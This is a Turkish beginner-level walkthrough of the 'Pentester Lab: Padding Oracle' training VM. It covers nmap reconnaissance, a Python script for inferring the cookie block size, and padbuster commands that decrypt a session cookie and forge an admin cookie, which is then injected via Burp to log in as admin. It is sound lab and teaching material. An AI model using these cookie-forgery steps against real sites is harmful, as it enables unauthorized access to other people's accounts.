Merhabalar,

Malum ilk yazı olunca ağırdan alalım dedik ve başlangıç olarak ***Pentester Lab:Padding Oracle*** sanal makinesini kurcaladık. Dolayısıyla yazı boyunca kullanılacak üslup da başlangıç seviyesine hitap ediyor olacak. Faydalı olması dileğiyle.

> **Not:** Vm'e GSM operatörlerinin unuttuğu bi yerden giriştiğim için; 
>
>![images](screenshots/loading.jpg)
>
>[@rootofarch](https://twitter.com/rootofarch)'ın [*son yazısında*](https://github.com/rootofarch/walkthroughs/tree/master/Donkey-Docker) bahsettiği **ruleti** atacak kadar geç bitirdim yazıyı :( 

>Onun ss'ini de en sona ekliyorum...şşt inme sona sürprizi kaçmasın :)

__Pentester Lab:Padding Oracle__

Sanal makinenin detaylarına ve ek bağlantılara [*buradan*](https://www.vulnhub.com/entry/pentester-lab-padding-oracle,174/) ulaşabilirsiniz.

Vm, adından da anlaşılacağı gibi `padding oracle` olarak geçen atağı simüle etmek için hazırlanmış. Bu yüzden konuyu anlayabilmek için öncelikle bu kavramı incelemek gerekiyor. Atak yöntemi [*şu linkte*](https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth) derinlemesine işlenmiş. 

Hiçbiriniz o linke gitmedi tabii ama devam etmeden önce en azından **Example** başlığını okuyun da gelin, bekliyorum :)

-----

Geldiyseniz ufaktan başlayalım; indirdiğimiz **ISO** dosyasına ve tercihen **Kali Linux** sistemimize can veriyoruz. Vm'de şöyle bir başlangıç bizi karşılıyor:

![images](screenshots/01.png)

Vm her ne kadar **"Üzerimde http servisi açık"** diye bağırsa da n'olur n'olmaz diyerek prosedürü bozmuyoruz.

```
$ ifconfig
```

![images](screenshots/02.png)

ile **Kali** makinemizin **IP** adresini öğrenip, hedefin adresini ve açık olan portları tespit edebilmek için **nmap** taramamıza geçiyoruz.

```
$ nmap -sV 192.169.43.219/24
```

![images](screenshots/03.png)

> **Tip:** Burada emin olduğumuz için standart tarama yaptık ancak genelde ufak sürprizlere karşı tüm portları taramakta fayda var. Çünkü ***nmap*** default olarak ***top 1000*** port üzerinde  tarama yapıyor.
> ```
> $ nmap -p 1-65535 [IP SCOPE] #nmap --help
> ```

görüldüğü üzere **80** portunda **HTTP** servisi aktif durumda. Hemen **browser**'ımıza koşuyoruz.

![images](screenshots/04.png)

buna göre amacımız;

- **admin** kullanıcı adı ile **login** olmak

**register** sekmesinde **admin** kullanıcı adı ile yeni bir hesap oluşturmayı deniyoruz. Tabii o bunu yer mi? Yemez. Zaten olmasını beklemiyorduk :)

> **Tip:** Bazen servisleri hata vermeye zorlamak bize onlar hakkında ufak ipuçları kazandırabilir. Çünkü **error** kalıpları da ayırt edici özellikte olabiliyor.

![images](screenshots/05.png)

daha önce **nmap** taramamızda **MySQL** servisinin çalıştığını görmeseydik bile *Duplicate entry **'admin'** for key 'PRIMARY'* olarak dönen hata bize arkada çalışan servisin büyük ihtimalle **MySQL** olduğunu söylüyor olacaktı.

Neyse biz işimize dönelim ve kendi kullanıcımızı oluşturalım.

![images](screenshots/06.png)

**aucc** kullanıcı adı ile bir hesap oluşturup **login** olduk. Bu noktada `padding oracle` ibaresini hatırlamamız gerekiyor ve **cookie** var mı diye kontrol ediyoruz.

![images](screenshots/07.png)

sitenin çalışma şekli tam da başlangıçta verdiğim linkte anlatıldığı gibi. 

![images](screenshots/toldya.jpg)

Şimdi yapmamız gereken şey **login** esnasında **client** ile **server** arasına girerek **cookie**'ye müdahale etmek yani ***man in the middle attack***. Ama bundan önce iş **admin** cookie'sini oluşturmakta.

Ufak bi araştırma sonucu `padding oracle` atakları için biçilmiş kaftan olan **padbuster** adında bi araç buluyoruz. **Kali'de** zaten bulunuyor ve kullanımı kolay. Ama aracın bizden istediği **inputlardan** birisine hala sahip değiliz; ***block-size***

![images](screenshots/08.png)

**Block-size'ı** bulma konusunda en hızlı yol tabii ki deneme yanılma ama -nasıl becerdiysem- bulamadım :( Haliyle akılsız başın cezasını parmaklar çekiyor ve kısa bi script yazıyoruz:

```
#!/usr/bin/python

import urllib
import base64

with open("cookies") as file:
    cookies = file.readlines()
cookies = [x.strip() for x in cookies]

print("Len. Cookie")

for cookie in range(len(cookies)):
	
 	x = urllib.unquote_plus(cookies[cookie])
 	x = base64.b64decode(x)
 	print(len(x),cookies[cookie])
```

buradaki mantık **username'deki** karakter sayısını artırarak *(au, aucc, auccauc...)* elde ettiğimiz **cookie'lerin** üretiminde kullanılan algoritmaya **padding** işlemini yaptırmak. 

![images](screenshots/09.png)

**Output'a** bakacak olursak da açık şekilde görülüyor **block-size'ın 8**  olduğu. Bu da demek oluyor ki **padbuster'ı** kullanmaya hazırız.

```
$ padbuster http://192.168.43.247/login.php JrTKq42sXw63THYmbbIgK147lo%2BPfxJ6 8 --cookies auth=JrTKq42sXw63THYmbbIgK147lo%2BPfxJ6 --encoding 0
```

*"Enter an ID that matches the error condition"* uyarısına benim durumum için **2** girmem gerekti.

![images](screenshots/10.png)
![images](screenshots/11.png)

***Decrypted value (ASCII) : user=aucc*** olarak tertemiz çıktı. Bu algoritma ile ***"user=admin"*** i encrypt etmemiz gerekiyor.

```
$ padbuster http://192.168.43.247/login.php JrTKq42sXw63THYmbbIgK147lo%2BPfxJ6 8 --cookies auth=JrTKq42sXw63THYmbbIgK147lo%2BPfxJ6 --encoding 0 --plaintext user=admin
```

![images](screenshots/12.png)
![images](screenshots/13.png)

***Encrypted value*** elimizde olduğuna göre tek yapmamız gereken **login** esnasında bizim **auth** değerimizi araya sıkıştırmak. Bunun için **burp** kullanabiliriz.

![images](screenshots/14.png)

değeri değiştirip **forward** ettiğimizde

![images](screenshots/15.png)
![images](screenshots/16.png)

o yeşil yazıyı görüp sevindirik oluyoruz :) derken... 

**rulet** yandan göz kırpıyor ( -_- ) ve ***"Zaten sistem değiştirecektim"*** bahanesiyle veriyorum gazı ama ilk denemede gol oluyor :D

![images](screenshots/17.jpg)
![images](screenshots/18.jpg)

sistem gittiğine göre artık yeni sistemi kurunca başka zaafiyetli makineler ile görüşmek üzere :D

----
**[Mahmut Sami Karaca](https://twitter.com/msamikaraca_)**

